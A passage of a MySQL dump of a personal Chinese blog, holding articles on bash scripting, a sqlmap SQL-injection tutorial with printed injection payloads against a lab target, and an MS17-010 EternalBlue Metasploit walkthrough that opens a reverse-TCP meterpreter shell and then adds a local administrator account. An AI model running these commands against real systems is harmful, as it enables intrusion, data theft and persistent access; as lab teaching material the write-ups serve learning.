]\npublic@DESKTOP-EKBL96L:/home$ echo $?\n0\n~~~\n\n(3)&ensp; <font size =4 color=red >扩展：</font> 多条件判断（&& 表示前一条命令执行成功时，才执行后一条命令，|| 表示上一条命令执行失败后，才执行下一条命令）。\n\n~~~shell\npublic@DESKTOP-EKBL96L:/home$ [ $[3+5] -eq 8 ] && echo \"ok\" || echo \"no\"\nok\n~~~\n\n~~~shell\npublic@DESKTOP-EKBL96L:/home$ [ $[3+5] -eq 9 ] && echo \"ok\" || echo \"no\"\nno\n~~~\n\n## 流程控制（重点）\n\n#### 1、if 判断\n\n基础语法：\n\n~~~shell\nif [ 条件判断 ];then\n\n	 程序\n\nfi\n~~~\n\n或者\n\n~~~shell\nif [ 条件判断 ]\n	then\n		程序\nfi\n~~~\n\n**实例：** 如果输入值为1 则输出 Hello ，如果输入值为2 则输出 word！\n\n~~~shell\n#!/bin/bash\n\nif [ $1 -eq 1 ]\nthen\n        echo \"Hello\"\nelif [ $1 -eq 2 ];then\n        echo \"word！\"\nfi\n~~~\n\n#### 2、case 语句\n\n基本语法：\n\n~~~shell\ncase $变量名 in\n\"值1\")\n	如果变量的值等于值1，则执行程序1\n;;\n\"值2\")\n	如果变量的值等于值2，则执行程序2\n;;\n... ... \n*)\n	如果变量值都不是以上的值，则执行此程序\n;;\nesac\n~~~\n\n实例：\n\n~~~shell\n#!/bin/bash\ncase $1 in\n1)\n        echo \"sta1\"\n;;\n2)\n        echo \"sta2\"\n;;\n3)\n        echo \"sta3\"\n;;\n*)\n        echo \"null\"\n;;\nesac\n\npublic@DESKTOP-EKBL96L:~$ ./case.sh 1\nsta1\npublic@DESKTOP-EKBL96L:~$ ./case.sh 2\nsta2\npublic@DESKTOP-EKBL96L:~$ ./case.sh 5\nnull\n~~~\n\n#### 3、for 循环\n\n基础语法1\n\n~~~shell\nfor(( 初始值;循环控制条件;变量变化 ))\n	do\n		程序\n	done\n~~~\n\n实例：从 1 加到 100\n\n~~~shell\n#!/bin/bash\ns=0\nfor(( i=0;i<=100;i++ ))\n        do\n                s=$[$s+$i]			# 累加\n        done\n\necho $s\n\npublic@DESKTOP-EKBL96L:~$ bash for.sh\n5050								# 结果\n~~~\n\n基础语法2\n\n~~~shell\nfor 变量 in 值1 值2 值3 ... ...\n	do\n		程序\n	done\n~~~\n\n实例 1\n\n~~~shell\n#/bin/bash\n\nfor i in sta1 sta2 sta3		# 将值依次赋给i，输出打印。\ndo\n        echo $i\ndone\n\npublic@DESKTOP-EKBL96L:~$ bash for.sh\nsta1\nsta2\nsta3\n~~~\n\n实例2\n\n~~~shell\n#/bin/bash\n\nfor i in $*\ndo\n        echo $i\ndone\n\npublic@DESKTOP-EKBL96L:~$ bash for.sh st\nst\npublic@DESKTOP-EKBL96L:~$ bash for.sh st sta1 sta2 sta3\nst\nsta1\nsta2\nsta3\n~~~\n\n#### 4、while 循环\n\n基础语法\n\n~~~shell\nwhile [ 条件判断式 ]\n	do\n		程序\n	done\n~~~\n\n实例：从1 加到 100\n\n~~~shell\n#!/bin/bash\n\ns=0\ni=1\nwhile [ $i -le 100 ]\ndo\n        s=$[$s+$i]\n        i=$[$i+1]\ndone\n\necho $s\n\npublic@DESKTOP-EKBL96L:~$ bash while.sh\n5050\n~~~\n\n## read 读取控制台输出\n\n基本语法：\n\nread(选项)(参数)\n\n| 选项 | 介绍 |\n| --- | --- |\n| -p | 指定读取值时的提示符 |\n| -t | 指定读取值时等待的时间（秒） |\n\n| 参数 | 介绍 |\n| --- | --- |\n| 变量 | 指定读取值的变量名 |\n\n实例：7 秒内读入控制台输入的内容。\n\n~~~shell\n#!/bin/bash\n\nread -t 7 -p \"输入内容：\" STA	# 超过7秒，就执行。\n\necho $STA\n\npublic@DESKTOP-EKBL96L:~$ bash read.sh\n输入内容：AHGDIU\nAHGDIU\n~~~\n\n## 函数\n\n#### 1、系统函数\n\n> **basename 基本语法**\n\nbasename [string / pathname] [suffix]\n\n***功能描述：*** basename 命令会删除所有前缀包括最后一个（‘ / ’）字符，然后将字符串显示出来。简单理解为：剪切 / 前面的内容。\n\n***选项：*** suffix 为后缀，如果 suffix 被指定，basename 会将 pathname 或 string 中的 suffix 去掉（剪切）。\n\n实例：\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ basename /sta1/public/Demo/\"hello word!\"	# / 前面被剪切\nhello word!\n\npublic@DESKTOP-EKBL96L:~/ShellDemo$ basename /sta1/public/Demo/\"hello word!\" rd! # 后缀 rd! 被剪切\nhello wo\n~~~\n\n> ***dirname 基本语法***\n\ndirname 文件绝对路径\n\n***功能描述 :*** 从给定的包含绝对路径的文件名中去除文件名（非目录的部分），然后返回剩下的路径（目录的部分）。简单理解为获取文件路径。\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ dirname sta1/public/goofiest/demo.txt\nsta1/public/goofiest\n~~~\n\n#### 2、自定义变量。\n\n基本语法：\n\n~~~shell\n[function] funname[()]\n{\n\nAction;\n[return int]\n\n}\nfunname\n~~~\n\n***注意：*** 函数返回值，只能通过 $? 系统变量获得，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。return 后跟数值 n(0-255)\n\n实例：计算两个输入参数的和\n\n~~~shell\n#!/bin/bash\n\nfunction sum()\n{\n        s=0\n        s=$[$1+$2]\n        echo \"sum=\"$s\n\n}\nread -p \"加数：\" p1\nread -p \"被加数：\" p2\n\nsum $p1 $p2\n\npublic@DESKTOP-EKBL96L:~/ShellDemo$ bash sum.sh\n加数：3\n被加数：2\nsum=5\n~~~\n\n## Shell 工具（重点）\n\n#### 1、cut\n\n&ensp; cut 的工作就是\"剪\"，具体的说就是在文件中负责剪切数据。cut 命令从文件的每一行剪切字节、字符和字段并将这些字符、字段和字段输出。\n\n***基本用法：*** cut [选项参数]	filename\n\n<font size =4 color=red>说明：</font> 默认分隔符是制表符。\n\n***选项参数说明*** :\n\n| 选项参数 | 功能 |\n| --- | --- |\n| -f | 列号，提取第几列 |\n| -d | 分隔符，按照指定分隔符分割列 |\n\n***实例1：*** 切割 cut.txt 第一列\n\n~~~shell\nhello shell!\n\nhell shell\n\ncut   sta1\n\npublic@DESKTOP-EKBL96L:~/ShellDemo$ cut -d \" \" -f 1 cut.sh\nhello\n\nhell\n\ncut\n~~~\n\n***实例 2：*** 切割 sta.txt 第二、三列\n\n~~~shall\nsau hsuiqw iuhc UQHD\nhudhw wqjd qwihd ihcui dcow\n\n\npublic@DESKTOP-EKBL96L:~/ShellDemo$ cut -d \" \" -f 2,3 sta.txt\nhsuiqw iuhc\nwqjd qwihd\n~~~\n\n***实例 3：*** 在 sta.txt 中切割除 iuhc\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ cat sta.txt | grep iuhc\nsau hsuiqw iuhc UQHD\npublic@DESKTOP-EKBL96L:~/ShellDemo$ cat sta.txt | grep iuhc | cut -d \" \" -f 3\niuhc\n~~~\n\n***实例 4：*** 剪切出本机的 IP 地址。\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ ifconfig eth0 | grep netmask | cut -d \" \" -f 10\n172.17.149.242\n~~~\n\n#### 2、sed\n\n&ensp; **简介：** sed 是一种流编辑器，它一次处理一行内容。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”，接着用 sed 命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。看接着处理下一行，这样不断重复，直到文件末尾。文件内容并未变化。\n\n***基本用法:*** sed [选项参数] “command” filename\n\n**选项参数说明：**\n\n| 选项参数 | 功能 |\n| :-: | :-: |\n| -e | 直接在指令列模式上进行 sed 的动作编辑。 |\n\n**命令功能描述：**\n\n| 命令 | 功能描述 |\n| :---: | --- |\n| a | 新增，a 的后面可以接字符串，在下一行出现。 |\n| d | 删除 |\n| s | 查找并替换 |\n\n**实例：** 在 sta.txt 的第二行添加 \" hello word ! \"\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ sed \"2a hello wold!\" sta.txt\n\njava\nhello shell\nhello wold!\npython\n~~~\n\n【注意：】 原文件没发生改变。\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ cat sta.txt\n\njava\nhello shell\npython\n~~~\n\n**实例：** 删除 sta.txt 文件所有包含 shell 的行。\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ sed \"/shell/d\" sta.txt\n\njava\npython\n~~~\n\n**实例：** 将 sta.txt 文件中 shell 替换为 word\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ sed \"s/shell/word/g\" sta.txt	# g 表示全局\n\njava\nhello word\npython\n~~~\n\n**实例：** 删除 sta.txt 文件中的第二行，并将 python 替换为php\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ sed -e \"2d\" -e \"s/python/php/g\" sta.txt\n\njava\nphp\n~~~\n\n#### 3、awk\n\n**简介：** 一个强大的文本分析工具，把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分在进行分析处理。\n\n***基本用法：*** awk [选项参数] \"pattern1{action}	pattern2{action2} ... ...\" 	filename\n\n| --- | --- |\n| - | - |\n| pattern | 表示 AWK 在数据中查找的内容，就是匹配模式。 |\n| action | 在找到匹配内容时所执行的一系列命令。 |\n\n**选项参数说明：**\n\n| 选项参数 | 功能 |\n| --- | --- |\n| -F | 指定输入文件的分隔符 |\n| -v | 赋值一个用户定义变量 |\n\n**实例1：** 搜索 passwd 文明以 root 关键字开头的所有行，并输出该行的第一列和第七列。并用逗号隔开。\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ awk -F : \'/^root/{print $1\",\"$7}\' passwd\nroot,/bin/bash\n~~~\n\n**实例2：** 只显示 passwd 的第一列和第七列，以逗号分隔，并且在其开头添加 user，shell 在最后添加 hello\n\n~~~shell\nawk -F : \'{print $1\",\"$7} BEGIN{print \"user,shell\"} END{print \"hello\"}\' passwd\n~~~\n\n~~~shell\nuser,shell\nroot,/bin/bash\ndaemon,/usr/sbin/nologin\n... ...\nftps,/sbin/nologin\nmysql,/bin/false\nhello\n~~~\n\n**实例3：** 将 passwd 文件中的用户 id 增加数值 2 并输出\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ awk -v i=2 -F : \'{print $3+i}\' passwd\n2\n3\n4\n... ...\n~~~\n\n##### awk 的内置变量\n\n| 变量 | 说明 |\n| --- | --- |\n| FILENAME | 文件名 |\n| NR | 已读的记录值 （行号） |\n| NF | 浏览记录的域的个数（切割后，列的个数） |\n\n**实例1：** 统计 passwd 文件名，每行的行号，每行的列数\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ awk -F : \'{print \"filename:\" FILENAME , \"linenumber:\" NR , \"columns:\" NF }\' passwd\nfilename:passwd linenumber:1 columns:7\nfilename:passwd linenumber:2 columns:7\nfilename:passwd linenumber:3 columns:7\nfilename:passwd linenumber:4 columns:7\nfilename:passwd linenumber:5 columns:7\nfilename:passwd linenumber:6 columns:7\n~~~\n\n**实例2：** 查询 passwd 中空行所在的行号。\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ awk \'/^$/ {print NR}\' passwd	  # ^ 匹配字符串开始。\n															# $ 匹配字符串结尾。\n3\n7\n~~~\n\n#### 4、sort\n\n***简介：*** sort 命令是 Linux 里非常有用，它将文件进行排序，并将排序结果标准输出。\n\n**基本语法：** sort(选项)(参数)\n\n| 选项 | 参数 |\n| --- | --- |\n| -n | 按照数值的大小排序 |\n| -r | 以相反的顺序来排列 |\n| -t | 设置排列时所用的分隔字符 |\n| -k | 指定需要排序的列 |\n\n参数：指定待排序的文件列表\n\n**实例1：**\n\n~~~shell\npublic@DESKTOP-EKBL96L:~/ShellDemo$ cat sort.txt\nzhangsan:170:65\nlisi:180:60\nwangwu:160:55\nxiaoming:166:63\nxiaozhang:177:67\n\npublic@DESKTOP-EKBL96L:~/ShellDemo$ sort -t : -nk 2 sort.txt\nwangwu:160:55\nxiaoming:166:63\nzhangsan:170:65\nxiaozhang:177:67\nlisi:180:60\n~~~\n\n','/articles/2020/11/09/1604897129295.html','0',1604897129399,1604897129399,0.0004364948651770506,'1','','https://b3logfile.com/bing/20180406.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0),('1605714148649','sqlmap 自动注入','\n','简介：   sqlmap 是一个开源渗透测试，它可以自动检测和利用SQL注入漏洞并接管数据库的过程。 GET 方法： 简单参数：  -u   检测注入点。  sqlmap -u \"http://127.0.0.1/sqli/Less-1/\"  09:46:59] [INFO] GET parameter \'id\' is \'Generic UNION query (NULL) - 1 to 20 columns\' injectable GET parameter \'id\' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests: --- Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING claus....','安全','1584497886024','![](https://b3logfile.com/bing/20200827.jpg?imageView2/1/w/960/h/540/interlace/1/q/100)\n\n### 简介：\n\n&ensp; sqlmap 是一个开源渗透测试，它可以自动检测和利用SQL注入漏洞并接管数据库的过程。\n\n#### GET 方法：\n\n##### 简单参数：\n\n* **-u**   &ensp; 检测注入点。\n\n~~~makefile\nsqlmap -u \"http://127.0.0.1/sqli/Less-1/\"\n~~~\n\n~~~makefile\n09:46:59] [INFO] GET parameter \'id\' is \'Generic UNION query (NULL) - 1 to 20 columns\' injectable\nGET parameter \'id\' is vulnerable. Do you want to keep testing the others (if any)? [y/N] \nsqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: id=1\' AND 3695=3695 AND \'Jypy\'=\'Jypy\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: id=1\' AND (SELECT 4202 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(4202=4202,1))),0x71716271BY x)a) AND \'ARVx\'=\'ARVx\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=1\' AND (SELECT 1396 FROM (SELECT(SLEEP(5)))qyXl) AND \'Pwzg\'=\'Pwzg\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: id=-6340\' UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6a71,0x58646f726d77634c4c7852676854555a616d6a47574\n---\n[09:47:09] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 5.0\n[09:47:19] [INFO] fetched data logged to text files under \'/root/.local/share/sqlmap/output/192.168.1.100\'\n~~~\n\n* **--dbs**  &ensp; 列出所有数据库。\n\n~~~makefile\nsqlmap -u \"http://192.168.1.100/sqli/Less-1/?id=1\" --dbs\n~~~\n\n~~~makefile\n[09:49:56] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 5.0\n[09:49:56] [INFO] fetching database names\n[09:50:01] [INFO] retrieved: \'information_schema\'\n[09:50:03] [INFO] retrieved: \'challenges\'\n[09:50:05] [INFO] retrieved: \'mysql\'\n[09:50:07] [INFO] retrieved: \'performance_schema\'\n[09:50:09] [INFO] retrieved: \'security\'\n[09:50:11] [INFO] retrieved: \'test\'\navailable databases [6]:                                                                                        \n[*] challenges\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] security\n[*] test\n~~~\n\n* **--current-db**  &ensp; 列出当前数据库的名字。\n\n~~~makefile\nsqlmap -u \"http://192.168.1.100/sqli/Less-1/?id=1\" --current-db\n~~~\n\n~~~makefile\n[09:56:51] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 5.0\n[09:56:51] [INFO] fetching current database\ncurrent database: \'security\'					# 当前数据库\n~~~\n\n* **-D**  &ensp; 指定一个数据库。\n* **--tables**  &ensp; 列出表名。\n\n~~~makefile\nsqlmap -u \"http://192.168.1.100/sqli/Less-1/?id=1\" -D \"security\" --tables\n~~~\n\n~~~makefile\n[10:05:07] [INFO] fetching tables for database: \'security\'\n[10:05:11] [INFO] retrieved: \'emails\'\n[10:05:13] [INFO] retrieved: \'referers\'\n[10:05:15] [INFO] retrieved: \'uagents\'\n[10:05:17] [INFO] retrieved: \'users\'\nDatabase: security                                                                                              \n[4 tables]\n+----------+\n| emails   |\n| referers |\n| uagents  |\n| users    |\n+----------+\n~~~\n\n* **-T**  &ensp; 指定表名。\n* **--columns**  &ensp; 列出所有的字段名。\n\n~~~makefile\nsqlmap -u \"http://192.168.1.100/sqli/Less-1/?id=1\" -D \"security\" -T \"users\" --columns\n~~~\n\n~~~makefile\nDatabase: security                                                                                              \nTable: users\n[3 columns]\n+----------+-------------+\n| Column   | Type        |\n+----------+-------------+\n| id       | int(3)      |\n| password | varchar(20) |\n| username | varchar(20) |\n+----------+-------------+\n~~~\n\n* **-C** &ensp;  指定字段。\n* **--dump**  &ensp;  列出字段内容。\n\n~~~makefile\nsqlmap -u \"http://192.168.1.100/sqli/Less-1/?id=1\" -D \"security\" -T \"users\" -C \"username,password\" --dump\n~~~\n\n~~~makefile\nDatabase: security                                                                                              \nTable: users\n[13 entries]\n+----------+------------+\n| username | password   |\n+----------+------------+\n| Dumb     | Dumb       |\n| Angelina | I-kill-you |\n| Dummy    | p@ssword   |\n| secure   | crappy     |\n| stupid   | stupidity  |\n| superman | genious    |\n| batman   | mob!le     |\n| admin    | admin      |\n| admin1   | admin1     |\n| admin2   | admin2     |\n| admin3   | admin3     |\n| dhakkan  | dumbo      |\n| admin4   | admin4     |\n+----------+------------+\n~~~\n\n#### POST 方法：\n\n&ensp; post 自动注入基本和get自动注入差别不大，需要抓包。\n\n**抓包工具：** Burp\n\n**浏览器：** 	火狐\n\n**(1)** 打开浏览器随便输入值，这里我输入的是1，使用抓包工具将数据抓下来。\n\n![1605704069977.png](https://b3logfile.com/file/2020/11/1605704069977-7f0109d2.png)\n可以看见抓包工具抓到了相关数据。\n\n![1605704137004.png](https://b3logfile.com/file/2020/11/1605704137004-cca4b6d0.png)\n**(2)** 将数据复制下来，以**txt**的格式保存下来。然后同 **sqlmap** 工具进行检测和注入。这里用的是**-r** 参数。\n\n![1605705094458.png](https://b3logfile.com/file/2020/11/1605705094458-2f00576e.png)\n\n\n**(3)** 后面的注入和 **get** 注入一样，跑命令。\n\n~~~makefile\nsqlmap -r post01.text --dbs		# 列出所有数据库。\n\nsqlmap -r post01.text --current-db 		# 列出当前数据库的名字。\n\nsqlmap -r post01.text -D \"security\" --tables	# 查询指定数据库的表名\n\n等等\n~~~\n\n','/articles/2020/11/18/1605714148649.html','0',1605714148751,1605714148751,0.6576855542471793,'1','','https://b3logfile.com/bing/20200827.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0),('1605959249638','MS17-010漏洞渗透','\n',' 最近捯饬了一下渗透。感觉windows 还是最好不要关闭防火墙。早期的 win7 和 win 2008 R2 好像都存在ms17-010漏洞 。最近我实验了一下，的确成功渗透。本人从网上找了几篇博客进行参考对照，现在我将其整合以便今后进行查找。 准备工作：  kali 虚拟机 win 2008 R2 注意靶机的445端口开启才可以渗透  具体操作：  启动 kail 虚拟机并运行 msfconsole  root@kali:/home/public# msfconsole -q # 安静模式 msf5 &gt;   执行 search ms17-010  msf5 &gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-0....','kali','1584497886024','![](https://b3logfile.com/bing/20200130.jpg?imageView2/1/w/960/h/540/interlace/1/q/100)\n\n&ensp;最近捯饬了一下渗透。感觉**windows** 还是最好不要关闭防火墙。早期的 win7 和 win 2008 R2 好像都存在**ms17-010漏洞** 。最近我实验了一下，的确成功渗透。本人从网上找了几篇博客进行参考对照，现在我将其整合以便今后进行查找。\n\n### 准备工作：\n\n* kali 虚拟机\n* win 2008 R2\n* 注意靶机的445端口开启才可以渗透\n\n### 具体操作：\n\n* 启动 kail 虚拟机并运行 msfconsole\n\n~~~makefile\nroot@kali:/home/public# msfconsole -q	# 安静模式\nmsf5 >\n~~~\n\n* 执行 search ms17-010\n\n~~~makefile\nmsf5 > search ms17-010\n\nMatching Modules\n================\n\n   #  Name                                           Disclosure Date  Rank     Check  Description\n   -  ----                                           ---------------  ----     -----  -----------\n   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection\n   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\n   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n~~~\n\n##### 渗透操作\n\n* 先用扫描模块测试（可以忽略）\n\n~~~makefile\nmsf > use auxiliary/scanner/smb/smb_ms17_010	 # 也可以使用 use 1 命令\nmsf auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 172.17.149.241	# 靶机 IP\nmsf auxiliary(scanner/smb/smb_ms17_010) > run\n~~~\n\n~~~makefile\nmsf5 > use 1\nmsf5 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 172.17.149.241                                 \nRHOSTS => 172.17.149.241                                                                             \nmsf5 auxiliary(scanner/smb/smb_ms17_010) > run                                                       \n                                                                                                     \n[+] 172.17.149.241:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)\n[*] 172.17.149.241:445    - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf5 auxiliary(scanner/smb/smb_ms17_010)\n~~~\n\n可以看出存在漏洞（基本都存在）\n\n* 利用攻击模块，进行攻击\n\n~~~makefile\nmsf > use exploit/windows/smb/ms17_010_eternalblue\nmsf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp\nmsf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 172.17.149.241	# 靶机 IP\nmsf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 172.17.149.245	# kali IP\nmsf exploit(windows/smb/ms17_010_eternalblue) > exploit\n~~~\n\n~~~makefile\n[*] Sending stage (201283 bytes) to 172.17.149.241\n[*] Meterpreter session 2 opened (172.17.149.245:4444 -> 172.17.149.241:61311) at 2020-11-21 12:46:13 -0500\n[+] 172.17.149.241:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 172.17.149.241:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 172.17.149.241:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n\nmeterpreter > 		# 渗透成功\n~~~\n\n##### 提权操作：\n\n* 执行 shell 命令进入靶机的 cmd 窗口\n\n~~~makefile\nmeterpreter > shell\nProcess 5816 created.\nChannel 1 created.\nMicrosoft Windows [�汾 6.1.7601]\n��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����\n\nC:\\Windows\\system32>\n~~~\n\n* 转换编码（chcp 65001）\n\n~~~makefile\nC:\\Windows\\system32>chcp 65001\nchcp 65001\nActive code page: 65001\n~~~\n\n* 提权命令\n\n~~~makefile\nnet user	# 查看当前所有用户\nnet user username password /add  # 添加用户名和密码\nnet localgroup administrators username /add  # 将用户名设置为超级管理员\n~~~\n\n**声明 :**  **该命令请合法使用!!!**\n','/articles/2020/11/21/1605959249638.html','0',1605959249690,1608632563748,0.7175689747022903,'1','','https://b3logfile.com/bing/20200130.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0),('1607688608609','网站收藏','\n',' 记录一些自己收藏的网站  免费Frp内网穿透 v2ray acme生成ssl证书 渗透师导航 大圣盘 阿里巴巴矢量图标库 ISP IP 实时更新','收藏','1584497886024','![](https://b3logfile.com/bing/20190412.jpg?imageView2/1/w/960/h/540/interlace/1/q/100)\n\n&ensp;记录一些自己收藏的网站\n\n---\n\n[免费Frp内网穿透](https://www.natfrp.com/?page=panel)\n\n[v2ray](https://v2rayc.ml/)\n\n[acme生成ssl证书](https://github.com/acmesh-official/acme.sh)\n\n[渗透师导航](https://www.shentoushi.top/)\n\n[大圣盘](https://www.dashengpan.com/)\n\n[阿里巴巴矢量图标库](https://www.iconfont.cn/)\n\n[ISP IP 实时更新](https://ispip.clang.cn/)\n','/articles/2020/12/11/1607688608609.html','0',1607688608712,1613638310701,0.00036351636597276027,'1','','https://b3logfile.com/bing/20190412.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0);
/*!40000 ALTER TABLE `b3_solo_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_category`
--

DROP TABLE IF EXISTS `b3_solo_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_category` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `categoryTitle` varchar(64) NOT NULL COMMENT '分类标题',
  `categoryURI` varchar(255) NOT NULL COMMENT '分类访问路径',
  `categoryDescription` text NOT NULL COMMENT '分类描述',
  `categoryOrder` int(11) NOT NULL COMMENT '分类展现的排序',
  `categoryTagCnt` int(11) NOT NULL COMMENT '分类下聚合的标签计数',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='分类表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_category`
--

LOCK TABLES `b3_solo_category` WRITE;
/*!40000 ALTER TABLE `b3_solo_category` DISABLE KEYS */;
/*!40000 ALTER TABLE `b3_solo_category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_category_tag`
--

DROP TABLE IF EXISTS `b3_solo_category_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_category_tag` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `category_oId` varchar(19) NOT NULL COMMENT '分类 id',
  `tag_oId` varchar(19) NOT NULL COMMENT '标签 id',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='分类-标签关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_category_tag`
--

LOCK TABLES `b3_solo_category_tag` WRITE;
/*!40000 ALTER TABLE `b3_solo_category_tag` DISABLE KEYS */;
/*!40000 ALTER TABLE `b3_solo_category_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_comment`
--

DROP TABLE IF EXISTS `b3_solo_comment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_comment` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `commentContent` text NOT NULL COMMENT '评论内容',
  `commentCreated` bigint(20) NOT NULL COMMENT '评论时间戳',
  `commentName` varchar(50) NOT NULL COMMENT '评论人名称',
  `commentOnId` varchar(19) NOT NULL COMMENT '评论的文章/页面的 id',
  `commentSharpURL` varchar(255) NOT NULL COMMENT '评论访问路径，带 # 锚点',
  `commentThumbnailURL` text NOT NULL COMMENT '评论人头像图片链接地址',
  `commentURL` varchar(255) NOT NULL COMMENT '评论人链接地址',
  `commentOriginalCommentId` varchar(19) DEFAULT NULL COMMENT '评论回复时原始的评论 id，即父评论 id',
  `commentOriginalCommentName` varchar(50) DEFAULT NULL COMMENT '评论回复时原始的评论人名称，即父评论人名称',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='评论表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_comment`
--

LOCK TABLES `b3_solo_comment` WRITE;
/*!40000 ALTER TABLE `b3_solo_comment` DISABLE KEYS */;
/*!40000 ALTER TABLE `b3_solo_comment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_link`
--

DROP TABLE IF EXISTS `b3_solo_link`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_link` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `linkAddress` varchar(255) NOT NULL COMMENT '链接地址',
  `linkDescription` varchar(255) NOT NULL COMMENT '链接描述',
  `linkOrder` int(11) NOT NULL COMMENT '链接展现的排序',
  `linkTitle` varchar(255) NOT NULL COMMENT '链接标题',
  `linkIcon` varchar(255) NOT NULL COMMENT '链接图标链接地址',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='链接表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_link`
--

LOCK TABLES `b3_solo_link` WRITE;
/*!40000 ALTER TABLE `b3_solo_link` DISABLE KEYS */;
